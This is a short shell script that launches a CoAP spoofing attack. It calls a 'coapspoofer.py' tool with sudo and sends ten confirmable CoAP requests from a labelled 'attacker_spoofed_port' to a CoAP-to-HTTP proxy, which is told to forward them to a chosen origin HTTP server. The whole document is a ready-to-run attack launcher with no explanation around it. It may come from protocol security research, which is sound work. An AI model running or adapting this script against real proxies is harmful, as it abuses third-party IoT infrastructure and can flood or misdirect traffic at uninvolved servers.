proxy_ip=$1

origin_ip=$2

my_ip=$3
if [ -z $my_ip ]
then
	my_ip=`hostname -I | awk '{ printf $1 }'`
fi

me=`basename "$0"`
coap_port=5683
attacker_spoofed_port=7123

sudo python3 coapspoofer.py \
  --debug \
  --source $my_ip \
  --src-port $attacker_spoofed_port \
  --destination $proxy_ip \
  --dst-port $coap_port \
  --message-type CON \
  --code 001 \
  --uri-host $proxy_ip \
  --uri-path coap2http \
  --proxy-uri http://$origin_ip:80 \
  --num-messages 10